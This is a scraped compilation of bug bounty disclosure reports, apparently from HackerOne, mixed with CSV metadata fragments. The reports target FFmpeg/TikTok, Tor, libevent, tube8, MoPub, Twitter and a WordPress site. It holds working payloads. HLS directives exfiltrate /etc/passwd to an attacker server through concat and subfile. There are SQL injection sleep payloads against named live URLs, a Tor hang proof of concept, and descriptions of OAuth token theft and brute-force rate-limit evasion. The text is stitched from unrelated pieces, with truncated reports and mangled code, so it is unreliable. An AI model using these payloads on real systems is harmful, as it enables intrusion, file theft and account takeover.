FFmpeg includes libavcodec, an audio/video codec library used by many commercial and free software products, libavformat (Lavf), an audio/video container mux and demux library, and the core ffmpeg command-line program for transcoding multimedia files.
The SSRF-LFR in FFmpeg is pretty well known and old vulnerability but luckily I was able to find and exploit it in https://www.tiktok.com/upload/ functionality.
At first I couldn't exploit LFR and only got SSRF to my collaborator server.
After some digging I found out that the problem was that my text editor added new line(\r\n) at the end of header.m3u8 file.
Also this vulnerability leads to DOS but I decided not to test this issue.
Exploitation:
SSRF
For SSRF you just need to upload .avi file with injected HLS-directives inside.
Example:
Code 91 Bytes1#EXTM3U
2#EXT-X-MEDIA-SEQUENCE:0
3#EXTINF:10.0,
4http://yourserver.com/anything
5#EXT-X-ENDLIST
After that you will get a callback to your server. The user-agent will have Lavf(libavformat) version.
LFR
In order to exploit LFR you need to host special file on your server and refer to it inside the video you wanna upload.
Example:
header.m3u8 file you need to host at your server:
Code 64 Bytes1#EXTM3U
2#EXT-X-MEDIA-SEQUENCE:0
3#EXTINF:,
4http://yourserver.com?
Make sure that your header.m3u8 doesn't have anything after 3f byte(? sign). You can check that with hexdump -C header.m3u8
video.avi
You need to inject these commands inside video.avi file:
Code 120 Bytes1#EXTM3U
2#EXT-X-MEDIA-SEQUENCE:0
3#EXTINF:10.0,
4concat:http://yourserver.com/header.m3u8|file:///etc/passwd
5#EXT-X-ENDLIST
After uploading video.avi you will receive only first line of /etc/passwd file.
But we need more, right?
To exfiltrate the whole file(any file). We can use two techniques. 

using header.y4m(you can find it in referenced links):

Code 43 Bytes1YUV4MPEG2 W30 H30 F25:1 Ip A0:0 Cmono
2FRAME
This didn't work for me.
Subfile technique
In order to exfiltrate the whole file line by line you can use this directives:
Code 142 Bytes1#EXTM3U
2#EXT-X-MEDIA-SEQUENCE:0
3#EXTINF:10.0,
4concat:http://yourserver.com/header.m3u8|subfile,,start,1,end,10000,,:/etc/passwd
5#EXT-X-ENDLIST
start parameter and it's value(1) means that we start from first symbol of the file and the end parameter symbolises the end of the line. There is no need to know exact end value. After getting first line you can easily calculate the start value of second line and so on.
For example for the second line our command wiil be something like:
concat:http://yourserver.com/header.m3u8|subfile,,start,70,end,10000,,:/etc/passwd
In some cases you can extract the whole file with this directive inside you video file:
Code 103 Bytes1#EXTM3U
2#EXT-X-MEDIA-SEQUENCE:0
3#EXTINF:1.0
4/anything.txt
5#EXTINF:1.0
6file:///etc/passwd
7#EXT-X-ENDLIST
You could see the whole /etc/passwd as video preview.
But in our case the vulnerable software worked while our video got converted on the server side.
All of the examples of video files and files with directives you can find in referenced links and by just googling it.

i2d_RSA_PublicKey does a memory allocation internally and a shortage of allocatable memory will cause it to fail. Like I said in the other report, a repeatedly triggered memory leak by the attacker, or utilizing some way to allocate a large amount of memory, or a ""natural"" memory shortage on the system caused by another process using large amounts of memory could trigger this.
Here is a proof of concept:

Before you run this, you might want to run this command:
Code 17 BytesWrap lines Copy Download1ulimit -Sv 500000
so that process memory is limited to 500MB (so your whole system doesn't start lagging).
It should output something like this:
Code 89 BytesWrap lines Copy Download1allocated 100 * 4477420 bytes
2crypto_pk_digest returns: -1
3digest is: uninitialized mem..
In other words, digest is not touched by crypto_pk_digest() and retains it original value.

144238         if (data_len + conn->incoming_cmd_cur_len > MAX_COMMAND_LINE_LENGTH) {
154239           connection_write_str_to_buf(""500 Line too long.\r\n"", conn);
164240           connection_stop_reading(TO_CONN(conn));

234247       }
244248     } while (r != 1);
If connection_fetch_from_buf_line() returns -1, this means that the buffer (conn->incoming_cmd) is not large enough. conn->incoming_cmd_len is then increased to a size sufficiently large to hold the incoming command (lines 4243 - 4246). In order for this to work, data_len must be set to this required size by connection_fetch_from_buf_line().
If libevent bufferevents are not enabled, then connection_fetch_from_buf_line() is simply a proxy function for fetch_from_buf_line():
Code 110 BytesWrap lines Copy Download13785   }) ELSE_IF_NO_BUFFEREVENT {
23786     return fetch_from_buf_line(conn->inbuf, data, data_len);
33787   } 
This function will indeed set *data_len to the required size if the present buffer size is too small (line 2255):
Code 526 BytesWrap lines Copy Download12241 int
22242 fetch_from_buf_line(buf_t *buf, char *data_out, size_t *data_len)
32243 {

52245   off_t offset;
62246 
72247   if (!buf->head)
82248     return 0;
92249     
102250   offset = buf_find_offset_of_char(buf, '\n');
112251   if (offset < 0)
122252     return 0;
132253   sz = (size_t) offset;
142254   if (sz+2 > *data_len) {
152255     *data_len = sz + 2;
162256     return -1;
172257   } 
182258   fetch_from_buf(data_out, sz+1, buf);   
192259   data_out[sz+1] = '\0';
202260   *data_len = sz+1; 
212261   return 1;
222262 }   
However, if libevent bufferevents are enabled (by ./configuring tor with --enable-bufferevents), then the code on lines (3770 - 3784) is executed instead:
Code 884 BytesWrap lines Copy Download13765 int 
23766 connection_fetch_from_buf_line(connection_t *conn, char *data,

113775     if (ptr.pos == -1)
123776       return 0; /* No EOL found. */
133777     if ((size_t)ptr.pos+eol_len >= *data_len) {
143778       return -1; /* Too long */
153779     }     
163780     *data_len = ptr.pos+eol_len;
173781     r = evbuffer_remove(input, data, ptr.pos+eol_len);
183782     tor_assert(r >= 0);
193783     data[ptr.pos+eol_len] = '\0';
203784     return 1;
213785   }) ELSE_IF_NO_BUFFEREVENT {            
223786     return fetch_from_buf_line(conn->inbuf, data, data_len);
233787   }
243788 }
Following the size check on line 3777, *data_len is not altered and thus remains the same as before the invocation.
For incoming data larger than the initial buffer size (1024 bytes) and contains a linefeed character past 1024 bytes, this sends the control connection input routine into an infinite loop.
Proof of concept
$ ./configure --enable-bufferevents && make -j4
Now start tor with this torrc:
ControlPort 9999
then in another terminal:
$ cat genpoc.py
import sys
sys.stdout.write((chr(0x63) * 2000) + chr(0x0A) )
$ python genpoc.py >poc
$ ncat localhost 9999 <poc
tor now hangs and has to be killed with force (kill -9 <pid>).
Inter-protocol exploit
Since the only two prerequisites of the attack are:

Input longer than 1024 bytes
Input contains linefeed character after byte 1024

it's easy to think of other ways of making tor hang than manually creating a connection for this purpose.
Code 116 BytesWrap lines Copy Download1$ cat genpoc2.py 
2print ""curl http://localhost:9999/{}"".format(""x"" * 1200)
3$ python genpoc2.py >poc.sh
4$ bash poc.sh
This also causes tor to hang, because curl is sending this to tor:

Prior to the memcpy on line 976 it is not asserted that the range (packet + j) - (packet + j + label_len) does not exceed the length of the packet buffer (as stored in variable length). My proof of concept exploits the possibility to keep jumping around in the buffer (lines 959 - 968), until the buffer index (j) is at the very end --- then, an overread of 63 bytes will occur. No overwrite takes place.
As you know, an overread may result in a crash, depending on a variety of factors.
I believe the code in Tor is vulnerable and I will update this report with PoC against Tor itself as soon as I've constructed one.
Nobody has been notified of this bug except you. I will not contact the libevent developers about this issue unless you explicitly request so. It's up to you to notify them yourself.

Guido1 attachment:F70753: libevent-poc.pyasn   posted a comment. Jan 25th (7 years ago)Hello and thanks for the bug and the great report!
We are currently trying to see how this fits into our reward program.
As you can see in the bug rewards text we were not planning to pay out ""low severity"" vulnerabilities to third party libraries like libevent.
Still, this seems like a nice bug, so we would like to reward it somehow!
We also want to check if this can be a DoS vector for Tor relays or dirauths.
We will get back to you ASAP!guido   posted a comment. Jan 25th (7 years ago)Thanks!
Are you interested in a heap corruption/crash vulnerability in libevent that probably affects tor if it opens a specially crafted /etc/hosts ?
Guidoasn   posted a comment. Jan 25th (7 years ago)Hello friend!
With regards to the /etc/hosts bug, I think such a bug would be out of scope for the bug bounty program, but it would still be a nice bug to fix.
We would still be happy to credit you with the discovery of the bug of course :)
Coming back to you soon about the reward of this bug.The Internet Bug Bounty  rewarded guido with a $500 bounty. Jan 26th (7 years ago)Hello friend!
We decided $500 as the price of this bug. Out-of-bounds bugs are not super dangerous, but the potential of crashing exit nodes (that parse DNS queries with name_parse()) is concerning.
You are our first bug hunter! Thanks!
Please let us know if you would like to not be credited ,or be credited with a special name.
Otherwise, we will just credit you as ""guido"".
We will start fixing the bug ASAP. When we do, we will post the patch here, so that you check it out if you want.

Tor,51-100,1.0,1m-10m,$500.00,No value,0.0,Violation of Secure Design Principles,"[tor] pre-emptive defenses, potential vulnerabilities","guido  submitted a report to Tor.Feb 10th (7 years ago)Replacing all tor_malloc calls with tor_calloc and tor_malloc_zero
Zeroing memory upon allocating it will prevent vulnerabilities that consist of transmitting data buffers which are not wholly initialized with the intended data (or contain remnants of previous contents).
Pseudocode:
Code 83 BytesWrap lines Copy Download1char* outbuffer = tor_malloc(100);
2memcpy(outbuffer, inbuffer, i);
3send(outbuffer);
If i is the result of a calculation whose outcome is presumed to align with the outbuffer's size (100), but in practice is prone to a corner-case where the result is in fact less than 100, then whatever uninitialized memory is present in the allocated heap memory will be transmitted to the other party.
But if you're using tor_malloc_zero instead, then the uninitialized memory would simply consist of zeroes, and thus useless for a malicious recipient of the buffer.
tor_calloc is like tor_malloc_zero in that it zeroes the allocated memory before disclosing it to the invoking function, and moreover has the property of accepting two size_t parameters and verifying whether the product (result of multiplication) is prone to an overflow, and fails if it is. Therefore, it is ideal to use as a substitute for manual multiplication in preparation for a tor_malloc or tor_malloc_zero:
Code 38 BytesWrap lines Copy Download1tor_malloc(n * sizeof(some_struct_t));
In instances such as this, it is again presumed that the product of n and the sizeof cannot result in an overflow. Even when this is fairly obvious, I'd say there is no reason to delegate the multiplication to tor_calloc that offers a hard guarantee that the multiplication is safe. As your code grows, and the value of n starts hinging on factors that may not be immediately obvious, or if fields are added to some_struct_t in order to cater to future requirements, overflows may become a reality without the protection that tor_calloc offers.
Potential heap corruption via write_escaped_data in control.c
/** Given a <b>len</b>-character string in <b>data</b>, made of lines

terminated by CRLF, allocate a new string in *<b>out</b>, and copy the
contents of <b>data</b> into *<b>out</b>, adding a period before any period

the end. Replace all LF characters sequences with CRLF.  Return the number
of bytes in <b>out</b>.
/
STATIC size_t
write_escaped_data(const char data, size_t len, char **out)
{
size_t sz_out = len+8;
char outp;
const char start = data, end;
int i;
int start_of_line;
for (i=0; i<(int)len; ++i) {
if (data[i]== '\n')
sz_out += 2; / Maybe add a CR; maybe add a dot. /
}
out = outp = tor_malloc(sz_out+1);
end = data+len;
start_of_line = 1;
while (data < end) {
if (data == '\n') {
if (data > start && data[-1] != '\r')
outp++ = '\r';
start_of_line = 1;
} else if (data == '.') {
if (start_of_line) {
start_of_line = 0;
outp++ = '.';
}
} else {
start_of_line = 0;
}
outp++ = data++;
}
if (outp < out+2 || fast_memcmp(outp-2, ""\r\n"", 2)) {
outp++ = '\r';
outp++ = '\n';
}
outp++ = '.';
outp++ = '\r';
outp++ = '\n';
outp = '\0'; / NUL-terminate just in case. /
tor_assert((outp - out) <= (int)sz_out);
return outp - out;
}

There are two potential vulnerabilities lurking here:

If the input size (len) >= 0x80000000, then this loop will not execute at all:


Code 116 BytesWrap lines Copy Download1  for (i=0; i<(int)len; ++i) {
2    if (data[i]== '\n')
3      sz_out += 2; /* Maybe add a CR; maybe add a dot. */
4  }
Because the condition i<(int)len is effectively i<(negative number) and i is intialized to 0, this can never be true. As a result of this, the output buffer (whose size is based on sz_out) is too small to hold the result for an input buffer containing '\n' characters.
Triggering this is typically only feasible on a 64-bit system, because if the input buffer is >= 0x80000000 bytes, then sz_out is set to 0x80000008 bytes, and allocating such an amount twice (one for the input buffer, and one for the output buffer) is not possible on a 32-bit system.

If the equation (number of '\n' characters in input buffer * 2 + size of input buffer) exceeds 0xFFFFFFFF, then this will cause heap corruption on a 32-bit system, because sz_out overflows.

See my attached proof of concept. Compile and execute like this:
Code 156 BytesWrap lines Copy Download1gcc -fsanitize=address -fomit-frame-pointer write_escaped_data.c; ./a.out 1
2gcc -m32 -fsanitize=address -fomit-frame-pointer write_escaped_data.c; ./a.out 2
As for real exploitability, I spent some effort on creating a real, remote proof of concept for this, but because the data that write_escaped_data may process is the result a multitude of (to me) intricate processes it is hard to come up with a reliable attack.
write_escaped_data draws data from all the getinfohelper* functions (via handle_control_getinfo and handle_getinfo_helper) as well as the amalgate of many potentially many, reasonably large strings in control_event_networkstatus_changed_helper: 
Code 268 BytesWrap lines Copy Download1  SMARTLIST_FOREACH(statuses, const routerstatus_t *, rs,
2    {
3      s = networkstatus_getinfo_helper_single(rs);
4      if (!s) continue;
5      smartlist_add(strs, s);
6    });
7
8  s = smartlist_join_strings(strs, """", 0, NULL);
9  write_escaped_data(s, strlen(s), &esc);
base64_decode potential heap corruption on 32-bit systems
Code 179 BytesWrap lines Copy Download1int
2base64_decode(char *dest, size_t destlen, const char *src, size_t srclen)
3{
4...
5...
6  if (destlen < (srclen*3)/4)
7    return -1;
8  if (destlen > SIZE_T_CEILING)
9    return -1;
The problem here is that the multiplication (by 3) occurs before the division (by 4).
For source strings larger than 0xFFFFFFFF / 3 == 0x55555555, an overflow will occur within this calculation. If the result of the overflow-affected calculation is smaller than what destlen is, then this check will be passed and memory will be corrupted.
See my proof of concept:

So it's not really a vulnerability at present, but I thought I'd mention it to you since it struck me as odd and it could become a problem if you pass a dynamic, potentially short string (for ex. created with snprintf) to do_getpass.3 attachments:F72882: do_getpass.cF72883: base64_decode.cF72884: write_escaped_data.cguido   posted a comment. Feb 10th (7 years ago)Looks like I ruined the layout a bit in the write_escaped_data chapter, I had meant to put the listing of that function there.asn   posted a comment. Feb 13th (7 years ago)Hello guido,

the fact that this report contains multiple bugs makes it hard to analyze and figure out it's reward.
After discussion with other Tor devs, we are mainly concerned about the bug in write_escaped_data but we can't find a nice way to remotely trigger it either.
The base64_decode() bug is also interesting but we couldn't find a place where we call it with such huge strings from the network.  The size of most directory documents are restricted by size. If you can find such a codepath, please let us know.
With the current state of this bug report, we are considering rewarding $500 to this bug report, mainly because of the two bugs above.
I will let this open some more in case you get more time to analyze this.
Thanks again!The Internet Bug Bounty  rewarded guido with a $500 bounty. Mar 8th (7 years ago)Awarding $500 here. Will update the ticket when we file the bugs on the bug tracker.

Tor,51-100,1.0,1m-10m,$300.00,No value,0.0,Memory Corruption - Generic,Heap corruption via memarea.c,"guido  submitted a report to Tor.May 11th (7 years ago)Hello again,
There is a potential vulnerability in memarea.c.
common/memarea.c:
Code 317 BytesWrap lines Copy Download1230 void *
2231 memarea_alloc(memarea_t *area, size_t sz)
3232 {
4233   memarea_chunk_t *chunk = area->first;
5234   char *result;
6235   tor_assert(chunk);
7236   CHECK_SENTINEL(chunk);
8237   tor_assert(sz < SIZE_T_CEILING);
9238   if (sz == 0)
10239     sz = 1;
11240   if (chunk->next_mem+sz > chunk->U_MEM+chunk->mem_size) {
The vulnerability lies in the addition of a pointer and an integer on line 240:
Code 32 BytesWrap lines Copy Download1240   if (chunk->next_mem+sz ...
To which address chunk->next_mem points is not within the application's (tor) purview, since it originates from within malloc() (which is accessed via tor_malloc()) and to some extent the system's kernel memory management), and malloc() is implemented in the libc with which tor was linked.
My point is that no or few assumptions can be made about the virtual address to which chunk->next_mem points.
sz is variable and may be influenced by an external party on the network.
Furthermore, it is guaranteed that sz is smaller than SIZE_T_CEILING, which is 0x80000000 on 32 bit:
Code 32 BytesWrap lines Copy Download1tor_assert(sz < SIZE_T_CEILING);
The above predicates imply that 1) given a 32 bit system, where 2) chunk->next_mem happens to point to a virtual address of 0x80000000 or higher and 3) sz >= 0x100000000 - chunk->mem_next an overflow will occur in the addition of the pointer chunk->next_mem+sz, thus unduly evading this check, which was meant to assert whether is sufficient memory in the current block.
In other words, if chunk->next_mem is 0xA0000000, and memarea_alloc is called to request 0x60000000 bytes, then the following will happen:
Code 449 BytesWrap lines Copy Download1230 void *
2231 memarea_alloc(memarea_t *area, size_t sz)
3232 {     
4233   memarea_chunk_t *chunk = area->first;
5234   char *result;
6235   tor_assert(chunk);
7236   CHECK_SENTINEL(chunk);
8237   tor_assert(sz < SIZE_T_CEILING);
9238   if (sz == 0)
10239     sz = 1;
11240   if (chunk->next_mem+sz > chunk->U_MEM+chunk->mem_size) {
12...
13...   This code is not executed
14...
15254   } 
16255   result = chunk->next_mem;
17256   chunk->next_mem = chunk->next_mem + sz;
In this case, line 256 translate to:
Code 48 BytesWrap lines Copy Download1256   chunk->next_mem = 0xA0000000 + 0x60000000;
Eg. chunk->next_mem now equals 0.
The higher the value of chunk->next_mem, and the higher the maximum value of sz that a potential attacker can enforce to be allocated, the higher the odds of yielding a chunk->next_mem value that points to real data (eg. a block of heap memory allocated by tor).
I've used 32 bit in this example. 64 bit is theoretically possible too (SIZE_T_CEILING is larger on 64 bit as well), but less likely.
An easy way to test this is by changing this line in memarea.c alloc_chunk():
Code 29 BytesWrap lines Copy Download1res = tor_malloc(chunk_size);
to
Code 101 BytesWrap lines Copy Download1res = mmap((void*)0xF0000000, chunk_size, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
(also include #include <sys/mman.h>)
then this code will trigger a segmentation fault
Code 119 BytesWrap lines Copy Download1  memarea_t *area;
2  area = memarea_new();
3  char *mem = memarea_alloc(area, 0x10000000);
4  memset(mem, 0, 0x10000000);
(be aware that this example applies to 32 bit, so compile with CFLAGS=""-m32"")

Tor,51-100,1.0,1m-10m,$100.00,Low,2.0,Privacy Violation,languagechange event fires simultaneously on all tabs,"tomvg  submitted a report to Tor.Aug 8th (5 years ago)The languagechange event, which fires when the user modifies the browser's language settings fires simultaneously on all tabs. This would allow an adversary to link multiple visits to a single user: the adversary (e.g. a malicious ad provider) has a script that listens for this event, and when fired sends a signal to the adversary's server which includes the timestamp of the event. Since this is an event that does not occur very often (only when the user changes the browser's language), so the chances that this event occurs at the exact same millisecond on with multiple users is very small.
I believe this has been a small oversight, since the online and offline events do seem to be disabled because of this threat.
PoC
As a proof-of-concept, you can open http://192.31.23.250/_events/get-event-values.html and https://poc.tom.vg/events-session-associate/get-event-values.html in different tabs (these are from different origins), select onlanguagechange from the dropdown and press the ""Start"" button. Next, change the language of the browser in the ""Content"" tab of the preferences (about:preferences#content): just add/remove one of change the order. Afterwards you should see an event logged on both tabs with approximately the same timestamp (the value might slightly differ because of the timer resolution).geko Tor staff  posted a comment. Aug 11th (5 years ago)Thanks for this report and the PoC.

buf_add_chunk_with_capacity is called at various places but currently not with the capped parameter set to 0.
However, buf_pullup is called at various places and the call to preferred_chunk_size is reachable. Whether it is reachable with a parameter large enough that it will return 0 I'm not sure about.

tor_realloc will in effect be called with a size parameter of 0. Whether and how much legitimate heap memory realloc will allocate might be implementation-dependent. The point is that the following lines might overwrite heap memory:

since chunk is a memory area that has just been allocated to 0 (or 1, after correction) bytes.
The whole scenario is not very likely considering Tor's frugal memory consumption but it is nonetheless a programming fault in the buffers ""API"" that could lead to stability issues. Especially if you ever expand the use of buf_pullup, buf_new_with_capacity, and/or uncapped buf_add_chunk_with_capacity, it'll be wise to hard-limit the amounts of right-shifts in preferred_chunk_size (a single unintended negative integer -> size_t can be conducive in establishing an exploitation path).",https://hackerone.com/reports/163459,England,United Kingdom,Cambridge,2016,8,26,1,6
Traffic Factory,11-50,0.0,1m-10m,$200.00,Low,2.0,Business Logic Errors,WordPress Plugin Update Confusion at trafficfactory.com,"vavkamil  submitted a report to Traffic Factory.Oct 10th (about 1 year ago)Hi,
I'm currently researching a ""novel"" supply chain attack affecting WordPress plugins, and I believe your website might be vulnerable.
The way it works is similar to a recent Dependency Confusion attack, where a malicious actor can take over internal packages unclaimed on PyPI / npm registry.
If you use an internally developed WordPress plugin not present in WordPress Plugin Directory, an attacker might upload it there. That would introduce the ""Confused deputy problem"" attack scenario, where the privileged user, instructed to update all plugins regularly, inadvertently infects the instance with malware.
I wrote a custom scanner, which passively detects plugins on a front page (JS/CSS assets), and searches the slug name in the WP SVN registry. It found ""tf-elementor"" plugin installed at ""trafficfactory.com"":
https://www.trafficfactory.com/wp-content/plugins/tf-elementor/assets/css/tf9d3a.css?ver=5.6.5
currently not present in:
https://plugins.svn.wordpress.org/tf-elementor
Steps To Reproduce:
The WordPress approval process for new plugins is automated and open-source, so it's possible to see which checks needs to pass:

Slug must only contain lowercase alphanumeric characters and dash.
Slug can't have a reserved name like wp-admin (has_reserved_slug())
Slug can't be on a list of protected trademarks (has_trademarked_slug())
Slug can't be installed on more than 100 websites (wporg_stats_get_plugin_name_install_count)

The whole flow looks like this:

An attacker submits a plugin with the same name you use for a review
It will pass the review process, and the attacker gets access to the SVN repository
The attacker uploads the plugin files, and it's added to the WordPress Plugin Directory for anyone to use
The attacker adds a backdoor and bumps the plugin version
You will get a notification that a new update is available; when you update, your website gets compromised

I did not attempt to claim your plugin, as the update would inadvertently break the website (old plugin files will get deleted), but I simulated the attack with my custom plugin, and it works.
How to mitigate
There is no easy way to defend yourself because it's by design, and WordPress doesn't allow you to upload a ""dummy"" version of your plugin. You can either add the plugin you use in the WordPress Plugin Directory or change the plugin name to prevent the review process from succeeding.
The plugin slug can only contain lower case alphanumeric characters and dash as a delimiter. Some of the keywords are prohibited as well, which could help us in this case. That means that you can rename your custom plugins in the following ways:

internal_plugin_name
InternalPluginName
wp-internal-plugin-name

It is also possible to leverage a hook and write a custom update function, blocking the internal WP API call and replacing it with your own, similar to how a paid plugin offers custom updates from their servers.
Some plugins do that for you, for example, Easy Updates Manager, which allows you to block updates for specific plugins.
Supporting Material/References:
I wrote a custom scanner in Python, a WordPress Docker container to simulate the Plugin update process, a custom plugin to pass the review for the SVN registry, and an extensive write-up describing everything in more detail.
I plan to publish everything soon, but let me know, and I will share a draft with you beforehand. Feel free to requests any additional info from me, as I understand it sounds more like a theoretical vulnerability without a valid PoC.
Thank you!
Kind regards,
@vavkamil
Impact
An attacker can hijack your plugin, currently not available in the WordPress Plugin Directory (SVN registry). If that happens and you update the plugin, it can introduce a backdoor or RCE, essentially giving keys to the kingdom to the attacker.",https://hackerone.com/reports/1364851,Prague,Czechia,Prague,2021,10,10,10,59

There is a blind SQL injection vulnerability in GET parameter topsort in page https://www.tube8.fr/ajax-hof/.
Description:
SQL functions can be injected into the SQL query. Using the sleep function, which makes the database sleep, we can notice the injection.
PoC
The following request will make the database sleep for around 20 seconds :
https://www.tube8.fr/ajax-hof/?toplimit=2&topsort=followers+or+sleep(0.000000001)
Larger value in the sleep function will make the request timeout. I think it may be because the injection point is in a WHERE statement, so the sleep function is executed on every record in the table.

The injection was found manually, used discovery methods are basically the same as described in this awesome article by @gerben_javado: https://gerbenjavado.com/manual-sql-injection-discovery-tips/
There was some kind of caching in place that hardened sqli identification (after each caching event we had to reproduce issue with different comment - it also made the injection undetectable by the scanners, because after several test requests response will be cached and couldn't be used to determine presence of sqli, so attacker needs to exploit this manually or write custom script or tamper for sqlmap).
##POC
Code 285 Bytes1https://www.tube8.com/ajax2/likeProfileComment/?profile_id=70418291&comment_id=291751-sleep(5)&hash=f42ffae0449536cfd0419826f3adf136

It worked on each second request (so it is actually bSQLi using dislike, the first request was making like and wasn't vulnerable). Also, after each successful SQLi test, the request appeared to be cached and vulnerability could be reproduced again only with different comment_id for some time. As a side effect, the comment could disappear for a few minutes.
Why -sleep(5), -benchmark(1000000000,1-1) payloads were used? I suspected that comment_id was processed as integer and was unescaped in the query so int-sleep(t) is a valid construction whatever the full query is, which doesn't require various quote/parenthesis tests for the quick manual confirmation. I found it also useful when WAF/filters block the quotes.
The severity was set to High because I propose Critical only for content injections:)

The settings for ""protected tweets"" that have been set from another application accidentally change after the user changes the settings on the twitter application.
Step To Reproduction

Set ""protected tweets"" from the Twitter Web or Twitter Lite application
Confirm and make sure that ""tweet is protected"" from the web or lite
then open the twitter application and change the hashtag (#) setting from OFF to ON

This method will trigger problems in the settings between the web and Twitter applications so that what has been set from outside the Twitter application can change.
the bug in this report has the same impact as report #664038 and #519059 but this bugs can still be triggered even though one of these bugs in reports has been fixed.
I say that because the bug in report #664038 and #519059 has been fixed and I can trigger the bug again in new versi app twitter 8.16.0 release 00
my conclusion this bug is Bypassing significant controls because after this bug is fixed it can be triggered again

I tried to guess on my account. I sent out nearly 1,000 requests, and I was virtually banned on request about 120. But when I changed my IP and tried logging in, I was logged into the account without any additional checks 
Description:*
Your web authentication endpoint, https://app.mopub.com/web-client/api/user/login, (POST), currently protects against credentials brute-force attacks only by requests rate-limiting based on IP.  This bug could allow an attacker to bruteforce the password of mopub users. This happens because mopub developer not set rate limitation protection in login page
Reproduction
To test this, send a POST request to ""https://app.mopub.com/web-client/api/user/login"" with the following parameters in the body:
Code 56 BytesWrap lines Copy Download1{""username"":""TARGET@exmple.com"",""password"":""HACKEDP@SS""}
Using curl, we can run an attack against a list of password with a fixed username (in this example ""TARGET@exmple.com""), You can use the following command to start guessing passwords from PASS_LIST Put in your list about 1000 passwords and start guessing. You will notice that you will be banned after several trials.

To bypass this protection a brute-force python script was developed that performs a login brute-force attack by rotating through these addresses, to never have a request refused. This effectively overcomes the IP-rate limiting and allows a full-fleged online brute-force attack at virtually unlimited speeds.

Recommendation:
Implement a Captcha after a reasonable number of failed login attempts against one account at the application-layer. The Captcha should not only be shown to offending IP addresses, but to anyone who attempts to login to the account under attack. Another option is to enable an account lockout policy which effectively locks down an account that has been attacked (e.g. after 20 failed consecutive logins) and requires out-of-band validation by the real account owner (e.g. email, mobile) before becoming accessible again.
Best regards,

A malicious user could run this against a huge list of mopub password with a fixed username, after that attack is finished he changes the password.  An attacker can freely bruteforce any username and can takeover any accountbugtriage-sophia   changed the status to Needs more info. Updated Mar 17th (3 years ago)Thank you for your report @updatelap,
We had some trouble reproducing this behavior using your POC. After approximately twelve requests we received the following error socket.timeout: The read operation timed out. After we saw this error we attempted to login to alert.wids@gmail.com account normally and we encountered an extra long delay. It seems there is a security control on this endpoint which increases the delay between each login attempt on a particular account.
Can you provide us a video that demonstrates you can use this behavior to guess 1000 potential passwords on a single account without encountering such long delays?

Twitter,5001-10000,0.0,over-1b,$560.00,No value,0.0,Violation of Secure Design Principles,Improper Verification of email address while saving Account Settings,"anshuman_bh  submitted a report to Twitter.Oct 10th (8 years ago)

Signup for Ads on twitter and navigate to ""Account Settings"" on ads.twitter.com/accounts


Enter any email address and save Account Settings. Notice that the email address gets updated successfully.


There is no verification email that is sent out to confirm that the email account updated actually belongs to the user account. 


This can be exploited or misused in a few ways. One such way is:


An attacker changes his account settings to update the email address to a victim's email address.


The attacker then navigates to Audience Manager and creates a list audience by uploading a CSV data file.


After some time, the victim receives an email from twitter saying that ""Your uploaded list test did not match enough people on Twitter to create a usable audience.""  See attached screenshot. 


The victim remains clueless as the attacker just leveraged the twitter platform to send this email to the victim. 


There might be other possible ways as well that an attacker can leverage the twitter email service to spam innocent victims.
Remediation:
On updating the email address under Account Settings, it should be verified by sending a confirmation link. 
PS - I understand that spamming is generally excluded from the scope of this bounty but when I clicked on the link provided under the Program details, it took me to a page which appears to only mention spamming attacks caused directly by attackers targeting victims. In this case, the attacker is completely out of the picture and is leveraging the twitter platform to spam victims. I just wanted to point that out. 1 attachment:F18569: 2014-10-10_13_51_26-anshuman_b_2000_-_Yahoo_Mail.pngmfinifter   closed the report and changed the status to Not Applicable. Oct 10th (8 years ago)Thanks for the detailed report.
I agree that this could be confusing for a victim in this situation, but I don't think there are any real security implications here.  As you mentioned, this is just spam in the worst case, and it is spam in which the attacker doesn't control any of the message content.
There's not much motivation for an attacker to launch a spam campaign where he doesn't control any of the message content, and this attack is further mitigated by the fact that there is an ""Unsubscribe"" link in the email the victim receives.
Unless I'm missing something here (please let me know if I am!), we don't plan to make any changes at this time based on this report.
Thanks again for thinking of Twitter security!

After some more testing, I noticed that it is indeed possible to control some part of the email that is sent to the victim. See attached screenshot. The email contains the name of the audience list which was the URL http://www.test.com/ in my case. So, attackers can easily phish victims this way. Hope this helps!1 attachment:F18659: Screen_Shot_2014-10-12_at_10.23.57_PM.png
    
    
        
            
                
                
                
            
        
    
anshuman_bh   posted a comment. Oct 13th (8 years ago)And, you mentioned that this is mitigated by the fact that they can click on Unsubscribe. But, if the victims do that, then they are technically un-subscribing to receive emails regarding their own legitimate accounts as well. So, that is definitely not mitigating the issue but completely blocking all future emails from twitter which I don't think the victim would want to do.

Twitter,5001-10000,0.0,over-1b,$840.00,No value,0.0,Improper Authentication - Generic,[Critical] - Steal OAuth Tokens,"tuckercarlson  submitted a report to Twitter.Apr 15th (7 years ago)Hi,
This bug is caused because of the same mis-configuration as #128119. Only this time Microsoft Outlook auth is vulnerable instead of Facebook. this time I will try to be as clear as possible. after sign up of Twitter, Twitter asks users to import contacts (and it only requires on authorization) - or simply going to https://twitter.com/who_to_follow/import will do that.
I believe you have configured your oauth redirect_uri as twitter.com in your app settings. Meaning Microsoft will accept:

http://twitter.com as valid
http://anything.twitter.com as valid
https://twitter.com as valid
https://anything.twitter.com/path/?anything as valid

So the forumla of a valid redirect_uri for twitter app is http(s?)://.twitter.com/
Okay, so now we make an open redirect. 
https://cards.twitter.com/cards/18ce53y6aap/yyms redirects to http://test.com and qualifies to bypass http(s?)://.twitter.com/ and we will add %2523 behind it like https://cards.twitter.com/cards/18ce53y6aap/yyms%2523 for microsoft to decode and send as a Hash %2523 -> %23 -> # with our stolen access_token.
We can then obtain this token using location.hash and all the user had to do is a single click (if already authorized - lots of people have)
To make things more clear, here is unlisted YouTube video to demonstrate how this works: https://youtu.be/apwbVpa2r6Y (also attached)

Description: The Android app overrides the ""Protect your Tweets"" setting set from outside the app in some cases when changing other settings.
Steps To Reproduce:

Log in to an account with unprotected tweets on the Android app.
Log in to the same account on mobile.twitter.com and turn on protected tweets.
Confirm that the account's tweets are protected.
In the Android app, go to the Direct Messages tab, click the gear icon and change a setting such as ""Receive message requests"" or ""Show read receipts.""
The account's tweets are now unprotected.

If this does not work, you may have to first explicitly unset the protected tweets setting in the Android app before setting it elsewhere.
Impact:
This can cause a user's tweets to unknowingly become public. It is possible this could be exploited by an attacker asking the user to change their settings but that is less likely to succeed than with the previous bug where only changing the email address was required.

